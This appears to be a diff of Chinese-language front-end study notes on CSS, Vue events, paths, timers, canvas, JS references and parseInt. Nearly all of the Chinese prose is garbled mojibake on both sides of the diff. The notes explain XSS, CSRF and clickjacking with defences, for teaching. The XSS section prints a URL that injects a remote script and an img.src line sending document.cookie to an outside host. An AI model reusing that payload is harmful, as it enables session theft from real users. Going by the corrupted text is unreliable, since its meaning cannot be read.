-±³¾°Í¼¿íµÄ°Ù·Ö±ÈµÃµ½µÄÆ«ÒÆÁ¿ÊÇ(ÈÝÆ÷µÄ¿í¶È-±³¾°Í¼µÄ¿í¶È)/°Ù·Ö±ÈÖµ!
-ÀýÈçÒ»¸öºÐ×Ó¿í1000 ¸ß600 ÄãÉèÖÃ±³¾°Í¼´óÐ¡Îª¿í800 ¸ß200
-È»ºóbackground: url() no-repeat 25% 25%;ÆäÊµ¾ÍÏàµ±ÓÚ
-background: url() no-repeat 50px 100px; ËùÒÔµ±Æ«ÒÆÁ¿Îª100%µÄÊ±ºòÆäÊµ¾ÍÏàµ±ÓÚÍùÈÝÆ÷ÓÒ¶ÔÆëÁË!
+èƒŒæ™¯å›¾å®½çš„ç™¾åˆ†æ¯”å¾—åˆ°çš„åç§»é‡æ˜¯(å®¹å™¨çš„å®½åº¦-èƒŒæ™¯å›¾çš„å®½åº¦)/ç™¾åˆ†æ¯”å€¼!
+ä¾‹å¦‚ä¸€ä¸ªç›’å­å®½1000 é«˜600 ä½ è®¾ç½®èƒŒæ™¯å›¾å¤§å°ä¸ºå®½800 é«˜200
+ç„¶åŽbackground: url() no-repeat 25% 25%;å…¶å®žå°±ç›¸å½“äºŽ
+background: url() no-repeat 50px 100px; æ‰€ä»¥å½“åç§»é‡ä¸º100%çš„æ—¶å€™å…¶å®žå°±ç›¸å½“äºŽå¾€å®¹å™¨å³å¯¹é½äº†!
 
 <div id="app">
     <div id="counter-event-example">
@@ -239,33 +239,33 @@ new Vue({
   }
 })
 </script>
-//×Ó×é¼þÍ¨¹ý$emitÀ´´¥·¢ÊÂ¼þ,¸¸×é¼þÔÚ×Ó×é¼þÀïÃæÍ¨¹ýÐ´v-on:ÊÂ¼þÃû="º¯ÊýÃû"À´¼àÌýÊÂ¼þ$emit('increment')Ö»Òªµã»÷°´Å¥,¾Í»á´¥·¢ÊÂ¼þ,ÍâÃæ¼àÌýµ½ÁË¾Í»áÈ¥Ö´ÐÐ¼àÌýÊÂ¼þÖÐµÄº¯Êý,ÒªÔÚÒ»¸öVueÀïÃæ²ÅÐÐ,ËùÒÔÕâÀïÊÇ²»ÄÜÐ´ÔÚ×Ô¶¨Òå×é¼þµÄÍâÃæµÄ!
+//å­ç»„ä»¶é€šè¿‡$emitæ¥è§¦å‘äº‹ä»¶,çˆ¶ç»„ä»¶åœ¨å­ç»„ä»¶é‡Œé¢é€šè¿‡å†™v-on:äº‹ä»¶å="å‡½æ•°å"æ¥ç›‘å¬äº‹ä»¶$emit('increment')åªè¦ç‚¹å‡»æŒ‰é’®,å°±ä¼šè§¦å‘äº‹ä»¶,å¤–é¢ç›‘å¬åˆ°äº†å°±ä¼šåŽ»æ‰§è¡Œç›‘å¬äº‹ä»¶ä¸­çš„å‡½æ•°,è¦åœ¨ä¸€ä¸ªVueé‡Œé¢æ‰è¡Œ,æ‰€ä»¥è¿™é‡Œæ˜¯ä¸èƒ½å†™åœ¨è‡ªå®šä¹‰ç»„ä»¶çš„å¤–é¢çš„!
 
-./ºÍ²»Ð´ÊÇÃ»ÓÐÇø±ðµÄ¶¼ÊÇÏà¶ÔÂ·¾¶
+./å’Œä¸å†™æ˜¯æ²¡æœ‰åŒºåˆ«çš„éƒ½æ˜¯ç›¸å¯¹è·¯å¾„
 images
    1.png
 index.html
-indexÀïÃæÒýÓÃÕâ¸öÍ¼Æ¬¿ÉÒÔÖ±½ÓÐ´images/1.pngÒ²¿ÉÒÔÐ´./images/1.png  ./Ïàµ±ÓÚÕÒµ½µ±Ç°ÎÄ¼þµÄÉÏ¼¶Ä¿Â¼Ò²¿ÉÒÔ²»Ð´Ö±½ÓÒýÓÃ
+indexé‡Œé¢å¼•ç”¨è¿™ä¸ªå›¾ç‰‡å¯ä»¥ç›´æŽ¥å†™images/1.pngä¹Ÿå¯ä»¥å†™./images/1.png  ./ç›¸å½“äºŽæ‰¾åˆ°å½“å‰æ–‡ä»¶çš„ä¸Šçº§ç›®å½•ä¹Ÿå¯ä»¥ä¸å†™ç›´æŽ¥å¼•ç”¨
 
-1.pngÒýÓÃÍâÃæindex.html ÒªÐ´ ../index.html
+1.pngå¼•ç”¨å¤–é¢index.html è¦å†™ ../index.html
 
-Ö»Ð´Ò»¸ö/±íÊ¾¸ùÄ¿Â¼ ÊÇÓÃ×÷¾ø¶ÔÂ·¾¶ 
+åªå†™ä¸€ä¸ª/è¡¨ç¤ºæ ¹ç›®å½• æ˜¯ç”¨ä½œç»å¯¹è·¯å¾„ 
 
 var timer1 = (cb,time)=>{(function loop(){setTimeout(loop,time);cb();})();}
 var timer2 = (cb,time)=>{(function loop(){cb();setTimeout(loop,time);})();}
 
-ÉÏÃæÁ½¸öº¯ÊýµÄÇø±ðÔÚÓÚ,µÚÒ»¸ö¶¨Ê±Æ÷ÓÀÔ¶¶¼»áÖ´ÐÐ,½øÈëÑ­»·ÊÂ¼þ,¶øµÚ¶þ¸öÈç¹ûcb()±¨´íÁË,ÄÇÃ´ºóÃæµÄ¶¨Ê±Æ÷¾Í²»»áÖ´ÐÐÁË
+ä¸Šé¢ä¸¤ä¸ªå‡½æ•°çš„åŒºåˆ«åœ¨äºŽ,ç¬¬ä¸€ä¸ªå®šæ—¶å™¨æ°¸è¿œéƒ½ä¼šæ‰§è¡Œ,è¿›å…¥å¾ªçŽ¯äº‹ä»¶,è€Œç¬¬äºŒä¸ªå¦‚æžœcb()æŠ¥é”™äº†,é‚£ä¹ˆåŽé¢çš„å®šæ—¶å™¨å°±ä¸ä¼šæ‰§è¡Œäº†
 
     ctx.beginPath();
-    ctx.arc(75,75,50,0,Math.PI*2,true); // »æÖÆ
+    ctx.arc(75,75,50,0,Math.PI*2,true); // ç»˜åˆ¶
     ctx.moveTo(110,75);
-    ctx.arc(75,75,35,0,Math.PI,false);   // ¿Ú(Ë³Ê±Õë)
+    ctx.arc(75,75,35,0,Math.PI,false);   // å£(é¡ºæ—¶é’ˆ)
     ctx.moveTo(65,65);
-    ctx.arc(60,65,5,0,Math.PI*2,true);  // ×óÑÛ
+    ctx.arc(60,65,5,0,Math.PI*2,true);  // å·¦çœ¼
     ctx.moveTo(95,65);
-    ctx.arc(90,65,5,0,Math.PI*2,true);  // ÓÒÑÛ
+    ctx.arc(90,65,5,0,Math.PI*2,true);  // å³çœ¼
     ctx.stroke();
-    moveTo()±íÊ¾´ÓÄÄÀï¿ªÊ¼»­,Èç¹ûÄã²»ÉèÖÃµÄ»°ÄÇÃ´¾Í»á³öÏÖÒ»Ìõ»­±Ê´ÓÉÏ¸öÖÕµãµ½Õâ¸öÆðµã¾­¹ýµÄºÛ¼£
+    moveTo()è¡¨ç¤ºä»Žå“ªé‡Œå¼€å§‹ç”»,å¦‚æžœä½ ä¸è®¾ç½®çš„è¯é‚£ä¹ˆå°±ä¼šå‡ºçŽ°ä¸€æ¡ç”»ç¬”ä»Žä¸Šä¸ªç»ˆç‚¹åˆ°è¿™ä¸ªèµ·ç‚¹ç»è¿‡çš„ç—•è¿¹
 
 function test(person) {
   person.age = 26
@@ -283,24 +283,24 @@ const p1 = {
 const p2 = test(p1)
 console.log(p1) 
 console.log(p2)
-ÔÚº¯ÊýÀïÃæÏàµ±ÓÚperson = p1,¶øp1ÊÇ¸ö¶ÔÏó,ËùÒÔ¸³Öµ¸øpersonµÄÊÇ¸öÖ¸Õë,Äã¿ÉÒÔÀí½âÎªÒ»°ÑÔ¿³×,µ±personÓÐÔ¿³×Ö®ºó¾Í¿ÉÒÔ·ÃÎÊp1ÀïÃæÊôÐÔµÄÖµÒ²¿ÉÒÔ½øÐÐÐÞ¸Ä,µ«ÊÇÈç¹û½«ÁíÒ»¸ö¶ÔÏó¸³Öµ¸øperson,ÄÇÃ´ÕâÊ±ºòpersonÊÖÉÏµÄÔ¿³×¾Í±äÁË(Ã¿¸öÈËÖ»ÄÜÓÐÒ»¸öÔ¿³×)  
+åœ¨å‡½æ•°é‡Œé¢ç›¸å½“äºŽperson = p1,è€Œp1æ˜¯ä¸ªå¯¹è±¡,æ‰€ä»¥èµ‹å€¼ç»™personçš„æ˜¯ä¸ªæŒ‡é’ˆ,ä½ å¯ä»¥ç†è§£ä¸ºä¸€æŠŠé’¥åŒ™,å½“personæœ‰é’¥åŒ™ä¹‹åŽå°±å¯ä»¥è®¿é—®p1é‡Œé¢å±žæ€§çš„å€¼ä¹Ÿå¯ä»¥è¿›è¡Œä¿®æ”¹,ä½†æ˜¯å¦‚æžœå°†å¦ä¸€ä¸ªå¯¹è±¡èµ‹å€¼ç»™person,é‚£ä¹ˆè¿™æ—¶å€™personæ‰‹ä¸Šçš„é’¥åŒ™å°±å˜äº†(æ¯ä¸ªäººåªèƒ½æœ‰ä¸€ä¸ªé’¥åŒ™)  
 
-parseInt(string, radix)º¯Êý
+parseInt(string, radix)å‡½æ•°
 
-string ÊÇ±ØÐëµÄ£¬Òª±»½âÎöµÄ×Ö·û´®¡£
-radix ¿ÉÑ¡¡£±íÊ¾Òª½âÎöµÄÊý×ÖµÄ»ùÊý¡£¸ÃÖµ½éÓÚ 2 ~ 36 Ö®¼ä¡£Ò²¾ÍÊÇ°´Ê²Ã´½øÖÆÀ´½âÎö
+string æ˜¯å¿…é¡»çš„ï¼Œè¦è¢«è§£æžçš„å­—ç¬¦ä¸²ã€‚
+radix å¯é€‰ã€‚è¡¨ç¤ºè¦è§£æžçš„æ•°å­—çš„åŸºæ•°ã€‚è¯¥å€¼ä»‹äºŽ 2 ~ 36 ä¹‹é—´ã€‚ä¹Ÿå°±æ˜¯æŒ‰ä»€ä¹ˆè¿›åˆ¶æ¥è§£æž
 
-ÓÃ·¨
+ç”¨æ³•
 
-Èç¹ûÊ¡ÂÔ¸Ã²ÎÊý»òÆäÖµÎª 0£¬ÔòÊý×Ö½«ÒÔ 10 Îª»ù´¡À´½âÎö¡£
+å¦‚æžœçœç•¥è¯¥å‚æ•°æˆ–å…¶å€¼ä¸º 0ï¼Œåˆ™æ•°å­—å°†ä»¥ 10 ä¸ºåŸºç¡€æ¥è§£æžã€‚
 
-xss (cross-site-script)·´Éä¹¥»÷³£¼ûµÄÊÇÀûÓÃÊäÈë¿ò»òÕß±íµ¥ÔÚÀïÃæÊäÈëÒ»¶Îjs´úÂë,µ¼ÖÂ¿Í»§¶ËÈ¥Ö´ÐÐÕâÒ»¶Î´úÂë.×î³£¼ûµÄ¾ÍÊÇ¸øÓÃ»§·¢Ò»¸öÁ´½Ó,ÀûÓÃurl²ÎÊýÀ´½øÐÐ¹¥»÷http://www.zcool.com.cn/tosearch.do?page=0&world=%3Cscript%20src=%22http://saintcoder.duapp.com/joke/joke.js%22%3E%3C/script%3E Õâ¶ÎÁ´½ÓÊÇÈ¥Õ¾¿áÍøÕ¾µÄËÑË÷Ò³Ãæ,È»ºó¹Ø¼ü´ÊÊÇÒ»¸öscript±êÇ©,Ö¸ÏòµÄÊÇºÚ¿ÍÏëÒªÔËÐÐµÄÒ»¶Îjs´úÂë,¿Í»§¶Ë»áÖ±½ÓÖ´ÐÐÕâ¸ö½Å±¾,È»ºó¿ÉÄÜÕâ¸ö½Å±¾Ö±½Ó´´½¨Ò»¸öÃ»ÓÐ¿í¸ßµÄimg±êÇ©,²¢ÇÒ½«srcÖ¸ÏòºÚ¿ÍµÄ½Å±¾ÎÄ¼þ,ÔÚ´´½¨imgµÄÊ±ºò¾Í°Ñcookie¸ø·¢µ½ºÚ¿ÍÊÖÉÏÈ¥ÁËÀýÈçÏÂÃæ:img.src ='http://saintcoder.duapp.com/joke/joke.php?joke='+encodeURIComponent(document.cookie);
-ÎªÊ²Ã´ÕâÀï²»»áÓÐÍ¬Ô´²ßÂÔ???Æ¾Ê²Ã´ÄÜ¹»°ÑAÍøÕ¾µÄcookieÐÅÏ¢´«µ¼ºÚ¿ÍÊÖÉÏ?²Î¿¼jsonp,srcÕâ¸öÊôÐÔÊÇ²»ÊÜÍ¬Ô´²ßÂÔÏÞÖÆµÄ!!!ÇëÇóÍ¼Æ¬µÄÊ±ºòÒÑ¾­°Ñcookie·¢¹ýÈ¥ÁË
-ÕâÑùÔÚºÚ¿ÍÄÄÀï¾Í¿ÉÒÔ»ñÈ¡µ½ÓÃ»§µÄcookieÐÅÏ¢ÁË
+xss (cross-site-script)åå°„æ”»å‡»å¸¸è§çš„æ˜¯åˆ©ç”¨è¾“å…¥æ¡†æˆ–è€…è¡¨å•åœ¨é‡Œé¢è¾“å…¥ä¸€æ®µjsä»£ç ,å¯¼è‡´å®¢æˆ·ç«¯åŽ»æ‰§è¡Œè¿™ä¸€æ®µä»£ç .æœ€å¸¸è§çš„å°±æ˜¯ç»™ç”¨æˆ·å‘ä¸€ä¸ªé“¾æŽ¥,åˆ©ç”¨urlå‚æ•°æ¥è¿›è¡Œæ”»å‡»http://www.zcool.com.cn/tosearch.do?page=0&world=%3Cscript%20src=%22http://saintcoder.duapp.com/joke/joke.js%22%3E%3C/script%3E è¿™æ®µé“¾æŽ¥æ˜¯åŽ»ç«™é…·ç½‘ç«™çš„æœç´¢é¡µé¢,ç„¶åŽå…³é”®è¯æ˜¯ä¸€ä¸ªscriptæ ‡ç­¾,æŒ‡å‘çš„æ˜¯é»‘å®¢æƒ³è¦è¿è¡Œçš„ä¸€æ®µjsä»£ç ,å®¢æˆ·ç«¯ä¼šç›´æŽ¥æ‰§è¡Œè¿™ä¸ªè„šæœ¬,ç„¶åŽå¯èƒ½è¿™ä¸ªè„šæœ¬ç›´æŽ¥åˆ›å»ºä¸€ä¸ªæ²¡æœ‰å®½é«˜çš„imgæ ‡ç­¾,å¹¶ä¸”å°†srcæŒ‡å‘é»‘å®¢çš„è„šæœ¬æ–‡ä»¶,åœ¨åˆ›å»ºimgçš„æ—¶å€™å°±æŠŠcookieç»™å‘åˆ°é»‘å®¢æ‰‹ä¸ŠåŽ»äº†ä¾‹å¦‚ä¸‹é¢:img.src ='http://saintcoder.duapp.com/joke/joke.php?joke='+encodeURIComponent(document.cookie);
+ä¸ºä»€ä¹ˆè¿™é‡Œä¸ä¼šæœ‰åŒæºç­–ç•¥???å‡­ä»€ä¹ˆèƒ½å¤ŸæŠŠAç½‘ç«™çš„cookieä¿¡æ¯ä¼ å¯¼é»‘å®¢æ‰‹ä¸Š?å‚è€ƒjsonp,srcè¿™ä¸ªå±žæ€§æ˜¯ä¸å—åŒæºç­–ç•¥é™åˆ¶çš„!!!è¯·æ±‚å›¾ç‰‡çš„æ—¶å€™å·²ç»æŠŠcookieå‘è¿‡åŽ»äº†
+è¿™æ ·åœ¨é»‘å®¢å“ªé‡Œå°±å¯ä»¥èŽ·å–åˆ°ç”¨æˆ·çš„cookieä¿¡æ¯äº†
 
 
-»¹ÓÐÒ»ÖÖXSS DOM¹¥»÷
-Ç°ÌáÊÇÒ×ÊÜ¹¥»÷µÄÍøÕ¾ÓÐÒ»¸öHTMLÒ³Ãæ²ÉÓÃ²»°²È«µÄ·½Ê½´Ódocument.location »òdocument.URL »ò document.referrer»ñÈ¡Êý¾Ý£¨»òÕßÈÎºÎÆäËû¹¥»÷Õß¿ÉÒÔÐÞ¸ÄµÄ¶ÔÏó£©¡£
+è¿˜æœ‰ä¸€ç§XSS DOMæ”»å‡»
+å‰ææ˜¯æ˜“å—æ”»å‡»çš„ç½‘ç«™æœ‰ä¸€ä¸ªHTMLé¡µé¢é‡‡ç”¨ä¸å®‰å…¨çš„æ–¹å¼ä»Ždocument.location æˆ–document.URL æˆ– document.referrerèŽ·å–æ•°æ®ï¼ˆæˆ–è€…ä»»ä½•å…¶ä»–æ”»å‡»è€…å¯ä»¥ä¿®æ”¹çš„å¯¹è±¡ï¼‰ã€‚
 
  <HTML>
  2 <TITLE>Welcome!</TITLE>
@@ -311,250 +311,251 @@ xss (cross-site-script)·´Éä¹¥»÷³£¼ûµÄÊÇÀûÓÃÊäÈë¿ò»òÕß±íµ¥ÔÚÀïÃæÊäÈëÒ»¶Îjs´úÂë,µ¼
  7 </SCRIPT>
  8 <BR>
  9 Welcome to our system
-10 ¡­
+10 â€¦
 11 </HTML>
-ÇëÇóÏÂÃæÕâ¸öÍøÖ·
+è¯·æ±‚ä¸‹é¢è¿™ä¸ªç½‘å€
 http://www.vulnerable.site/welcome.html?name=<script>alert(document.cookie)</script>
-ÄÇÃ´script±êÇ©¾Í±»Ð´Èëµ½ÎÄµµÀïÃæÈ¥ÁË
-½â¾ö·½·¨:
-HttpOnly ·ÀÖ¹½ÙÈ¡ Cookie,ÓÃ»§µÄÊäÈë¼ì²é(×ªÒå),·þÎñ¶ËµÄÊä³ö¼ì²é,»¹ÓÐÉèÖÃcsp(content-security-policy)±ÈÈçÍ¨¹ýÉèÖÃhttp-headerÖ»ÔÊÐí¼ÓÔØ±¾Õ¾×ÊÔ´»¹¿ÉÒÔÉèÖÃÖ»ÔÊÐí¼ÓÔØhttpsÐ­ÒéÍ¼Æ¬µÈµÈ»¹¿ÉÒÔÉèÖÃmeta±êÇ©
+é‚£ä¹ˆscriptæ ‡ç­¾å°±è¢«å†™å…¥åˆ°æ–‡æ¡£é‡Œé¢åŽ»äº†
+è§£å†³æ–¹æ³•:
+HttpOnly é˜²æ­¢åŠ«å– Cookie,ç”¨æˆ·çš„è¾“å…¥æ£€æŸ¥(è½¬ä¹‰),æœåŠ¡ç«¯çš„è¾“å‡ºæ£€æŸ¥,è¿˜æœ‰è®¾ç½®csp(content-security-policy)æ¯”å¦‚é€šè¿‡è®¾ç½®http-headeråªå…è®¸åŠ è½½æœ¬ç«™èµ„æºè¿˜å¯ä»¥è®¾ç½®åªå…è®¸åŠ è½½httpsåè®®å›¾ç‰‡ç­‰ç­‰è¿˜å¯ä»¥è®¾ç½®metaæ ‡ç­¾
 
-CSRF ¿çÕ¾ÇëÇóÎ±Ôì
-getÇëÇó
-¿çÕ¾ÇëÇóÎ±ÔìÒ»°ãÊÇÔÚÓÃ»§²»ÖªÇéµÄÇé¿öÏÂÈÃÓÃ»§¶Ô·þÎñÆ÷·¢ÆðÁËÇëÇó,¼ÙÈçÓÃ»§ÒÔµÇÂ¼µÄ×´Ì¬ÏÖÔÚÕýÔÚÄ³ÐÂÎÅÍøÕ¾ä¯ÀÀ,²¢ÇÒÔÚÒ»ÌõÐÂÎÅÏÂÃæÆÀÂÛ,Ã¿ÌõÆÀÂÛºóÃæÓÐÒ»¸öÉ¾³ý°´Å¥,ÓÃ»§¿ÉÒÔÉ¾µô×Ô¼ºµÄÆÀÂÛ,Õâ¸öÊ±ºòÆäËûµØ·½µ¯³öÀ´Ò»¸öÍ¼Æ¬¶øÓÃ»§µã»÷ÁË,Õâ¸öÍ¼Æ¬µÄsrcÊôÐÔÕýºÃÊÇ"http://www.c.com:8002/content/delete/87343",ÄÇÃ´idÎª87343ÕâÌõÆÀÂÛ¾Í»áÉ¾³ýÕâÊÇgetÇëÇó!
+CSRF è·¨ç«™è¯·æ±‚ä¼ªé€ 
+getè¯·æ±‚
+è·¨ç«™è¯·æ±‚ä¼ªé€ ä¸€èˆ¬æ˜¯åœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹è®©ç”¨æˆ·å¯¹æœåŠ¡å™¨å‘èµ·äº†è¯·æ±‚,å‡å¦‚ç”¨æˆ·ä»¥ç™»å½•çš„çŠ¶æ€çŽ°åœ¨æ­£åœ¨æŸæ–°é—»ç½‘ç«™æµè§ˆ,å¹¶ä¸”åœ¨ä¸€æ¡æ–°é—»ä¸‹é¢è¯„è®º,æ¯æ¡è¯„è®ºåŽé¢æœ‰ä¸€ä¸ªåˆ é™¤æŒ‰é’®,ç”¨æˆ·å¯ä»¥åˆ æŽ‰è‡ªå·±çš„è¯„è®º,è¿™ä¸ªæ—¶å€™å…¶ä»–åœ°æ–¹å¼¹å‡ºæ¥ä¸€ä¸ªå›¾ç‰‡è€Œç”¨æˆ·ç‚¹å‡»äº†,è¿™ä¸ªå›¾ç‰‡çš„srcå±žæ€§æ­£å¥½æ˜¯"http://www.c.com:8002/content/delete/87343",é‚£ä¹ˆidä¸º87343è¿™æ¡è¯„è®ºå°±ä¼šåˆ é™¤è¿™æ˜¯getè¯·æ±‚!
 
-¶øÈç¹ûÊÇpostÇëÇó,ÆäÊµÒ²¿ÉÒÔÈÃÓÃ»§ÉÏµ±
-Í¬Ñù¼ÙÉèÓÐÒ»¸öÓÃ»§ÕýÔÚÒÔµÇÂ¼µÄ×´Ì¬ä¯ÀÀÄ³ÒøÐÐÍøÕ¾ www.bank.com,¸ÃÒøÐÐ×ªÕËµÄÒ³ÃæÊÇwww.bank.com/transfer.php, ¸ÃÒ³ÃæÓÐÁ½¸öÊäÈë¿ò·Ö±ðÊÇÃû×ÖºÍÃÜÂë»¹ÓÐÒ»¸öÌá½»°´Å¥,ÕâÊ±ºòÓÐÒ»¸öÍøÒ³Á´½Ó·¢¹ýÀ´ÁË,¸ÃÓÃ»§´ò¿ªÁË¸ÃÍøÒ³,È»¶øÕâ¸öÍøÒ³ÀïÃæÒ²ÓÐÁ½¸öÊäÈë¿òºÍÒ»¸öbutton°´Å¥,²¢ÇÒ»¹ÓÐÒ»¶Îjs½Å±¾,ÍøÒ³ÀïÃæÒ²ÓÐÒ»¸öform±íµ¥Í¬Ê±·½·¨Ò²ÊÇpostÇëÇó,ÀïÃæ±íµ¥×ªÕËÒ³Ãæ±í¸ñ¶¼ÊÇÒ»ÑùµÄ,ÖµÒÑ¾­ÊäÈëºÃ,²¢ÇÒÔÚjs½Å±¾ÀïÃæÈÃÍøÒ³Ò»´ò¿ª¾ÍÔËÐÐ,¾Íµã»÷°´Å¥Ìá½»±íµ¥,ÕâÑù¾Í¿ÉÒÔÎ±ÔìÒ»¸öpostÇëÇóÁË
+è€Œå¦‚æžœæ˜¯postè¯·æ±‚,å…¶å®žä¹Ÿå¯ä»¥è®©ç”¨æˆ·ä¸Šå½“
+åŒæ ·å‡è®¾æœ‰ä¸€ä¸ªç”¨æˆ·æ­£åœ¨ä»¥ç™»å½•çš„çŠ¶æ€æµè§ˆæŸé“¶è¡Œç½‘ç«™ www.bank.com,è¯¥é“¶è¡Œè½¬è´¦çš„é¡µé¢æ˜¯www.bank.com/transfer.php, è¯¥é¡µé¢æœ‰ä¸¤ä¸ªè¾“å…¥æ¡†åˆ†åˆ«æ˜¯åå­—å’Œå¯†ç è¿˜æœ‰ä¸€ä¸ªæäº¤æŒ‰é’®,è¿™æ—¶å€™æœ‰ä¸€ä¸ªç½‘é¡µé“¾æŽ¥å‘è¿‡æ¥äº†,è¯¥ç”¨æˆ·æ‰“å¼€äº†è¯¥ç½‘é¡µ,ç„¶è€Œè¿™ä¸ªç½‘é¡µé‡Œé¢ä¹Ÿæœ‰ä¸¤ä¸ªè¾“å…¥æ¡†å’Œä¸€ä¸ªbuttonæŒ‰é’®,å¹¶ä¸”è¿˜æœ‰ä¸€æ®µjsè„šæœ¬,ç½‘é¡µé‡Œé¢ä¹Ÿæœ‰ä¸€ä¸ªformè¡¨å•åŒæ—¶æ–¹æ³•ä¹Ÿæ˜¯postè¯·æ±‚,é‡Œé¢è¡¨å•è½¬è´¦é¡µé¢è¡¨æ ¼éƒ½æ˜¯ä¸€æ ·çš„,å€¼å·²ç»è¾“å…¥å¥½,å¹¶ä¸”åœ¨jsè„šæœ¬é‡Œé¢è®©ç½‘é¡µä¸€æ‰“å¼€å°±è¿è¡Œ,å°±ç‚¹å‡»æŒ‰é’®æäº¤è¡¨å•,è¿™æ ·å°±å¯ä»¥ä¼ªé€ ä¸€ä¸ªpostè¯·æ±‚äº†
 
-½â¾ö·½·¨:ÑéÖ¤Âë headerÀïÃæµÄreferer token  HTTP ÇëÇóÖÐÒÔ²ÎÊýµÄÐÎÊ½¼ÓÈëÒ»¸öËæ»ú²úÉúµÄ token£¬²¢ÔÚ·þÎñÆ÷¶Ë½¨Á¢Ò»¸öÀ¹½ØÆ÷À´ÑéÖ¤Õâ¸ö token£¬Èç¹ûÇëÇóÖÐÃ»ÓÐ token »òÕß token ÄÚÈÝ²»ÕýÈ·£¬ÔòÈÏÎª¿ÉÄÜÊÇ CSRF ¹¥»÷¶ø¾Ü¾ø¸ÃÇëÇó¡£
+è§£å†³æ–¹æ³•:éªŒè¯ç  headeré‡Œé¢çš„referer token  HTTP è¯·æ±‚ä¸­ä»¥å‚æ•°çš„å½¢å¼åŠ å…¥ä¸€ä¸ªéšæœºäº§ç”Ÿçš„ tokenï¼Œå¹¶åœ¨æœåŠ¡å™¨ç«¯å»ºç«‹ä¸€ä¸ªæ‹¦æˆªå™¨æ¥éªŒè¯è¿™ä¸ª tokenï¼Œå¦‚æžœè¯·æ±‚ä¸­æ²¡æœ‰ token æˆ–è€… token å†…å®¹ä¸æ­£ç¡®ï¼Œåˆ™è®¤ä¸ºå¯èƒ½æ˜¯ CSRF æ”»å‡»è€Œæ‹’ç»è¯¥è¯·æ±‚ã€‚
 
-×Ü½áxssÇëÇóÊÇÀûÓÃ½Å±¾½øÐÐ¹¥»÷,¿ÉÒÔ»ñÈ¡ÓÃ»§µÄÐÅÏ¢,°üÀ¨ÕËºÅ»òÕßÃÜÂëµÈµÈ,¶øcsrfÔòÊÇÀûÓÃÓÃ»§È¥×öºÚ¿ÍÏë×öµÄÊÂ,ÕâÁ½ÕßÒ²¿ÉÒÔ½áºÏ,Èç¹ûÒ»¸öÍøÕ¾ÓÐtokenÑéÖ¤,µ«ÊÇËûÈ´´æÔÚxssÂ©¶´,ÄÇÃ´ÎÒÃÇ¿ÉÒÔÓÃxss¹¥»÷ÄÃµ½Ò³ÃæÀïÃæµÄtokenÖµ,È»ºóÔÙÈ¥·¢ËÍÒ»¸öºÏÀíµÄÇëÇó
-csrfÔÚÓÚÒýµ¼ÓÃ»§µã»÷Á´½Ó,Á´½ÓÀïÃæÓÐÒ»¸öimg src¾Í¿ÉÒÔÒÔÄãµÄµÇÂ¼×´Ì¬·¢ÆðÇëÇóÁË.
-xss·´ÉäÐÍ¹¥»÷ÔÚÓÚÀûÓÃurl²ÎÊýÀ´Ö¸ÏòÒ»¸öjs½Å±¾È»ºó¿Í»§¶Ë½âÎöºóÖ±½Ó½øÐÐÖ´ÐÐÁËÕâ¸ö½Å±¾.
+æ€»ç»“xssè¯·æ±‚æ˜¯åˆ©ç”¨è„šæœ¬è¿›è¡Œæ”»å‡»,å¯ä»¥èŽ·å–ç”¨æˆ·çš„ä¿¡æ¯,åŒ…æ‹¬è´¦å·æˆ–è€…å¯†ç ç­‰ç­‰,è€Œcsrfåˆ™æ˜¯åˆ©ç”¨ç”¨æˆ·åŽ»åšé»‘å®¢æƒ³åšçš„äº‹,è¿™ä¸¤è€…ä¹Ÿå¯ä»¥ç»“åˆ,å¦‚æžœä¸€ä¸ªç½‘ç«™æœ‰tokenéªŒè¯,ä½†æ˜¯ä»–å´å­˜åœ¨xssæ¼æ´ž,é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ç”¨xssæ”»å‡»æ‹¿åˆ°é¡µé¢é‡Œé¢çš„tokenå€¼,ç„¶åŽå†åŽ»å‘é€ä¸€ä¸ªåˆç†çš„è¯·æ±‚
+csrfåœ¨äºŽå¼•å¯¼ç”¨æˆ·ç‚¹å‡»é“¾æŽ¥,é“¾æŽ¥é‡Œé¢æœ‰ä¸€ä¸ªimg srcå°±å¯ä»¥ä»¥ä½ çš„ç™»å½•çŠ¶æ€å‘èµ·è¯·æ±‚äº†.
+xssåå°„åž‹æ”»å‡»åœ¨äºŽåˆ©ç”¨urlå‚æ•°æ¥æŒ‡å‘ä¸€ä¸ªjsè„šæœ¬ç„¶åŽå®¢æˆ·ç«¯è§£æžåŽç›´æŽ¥è¿›è¡Œæ‰§è¡Œäº†è¿™ä¸ªè„šæœ¬.
 
-µã»÷½Ù³Ö!
-Í¨¹ýiframeÒýÈëÏëÒª¹¥»÷µÄÍøÕ¾,²¢½«ÆäÍ¸Ã÷¶ÈÉèÎª0,µ«ÊÇz-indexÉèÎª2,È»ºóÍøÒ³ÀïÃæÓÐÒ»¸öbutton°´Å¥z-indexÉèÎª1,µ±ÄãÈ¥µãÕâ¸öbuttonµÄÊ±ºòÆäÊµbuttonÊÇÔÚiframeÏÂÃæµÄ,ÆäÊµÄãµãÁËiframeÒ³ÃæµÄ°´Å¥!
-self±íÊ¾µ±Ç°´°¿Ú,top±íÊ¾¶¥¼¶´°¿Ú <body><iframe ...><body> iframeÀïÃæÒýÈëÒ»¸öÍøÕ¾ÄÇÃ´¼ÙÈç¸ÃÍøÕ¾ÓÐÅÐ¶¨self==top²Å¼ÓÔØµÄÊ±ºò,Èç¹û²»ÏàµÈ¾Í»á±»À¹½Ø.self¾ÍÊÇifram×Ô¼º
+ç‚¹å‡»åŠ«æŒ!
+é€šè¿‡iframeå¼•å…¥æƒ³è¦æ”»å‡»çš„ç½‘ç«™,å¹¶å°†å…¶é€æ˜Žåº¦è®¾ä¸º0,ä½†æ˜¯z-indexè®¾ä¸º2,ç„¶åŽç½‘é¡µé‡Œé¢æœ‰ä¸€ä¸ªbuttonæŒ‰é’®z-indexè®¾ä¸º1,å½“ä½ åŽ»ç‚¹è¿™ä¸ªbuttonçš„æ—¶å€™å…¶å®žbuttonæ˜¯åœ¨iframeä¸‹é¢çš„,å…¶å®žä½ ç‚¹äº†iframeé¡µé¢çš„æŒ‰é’®!
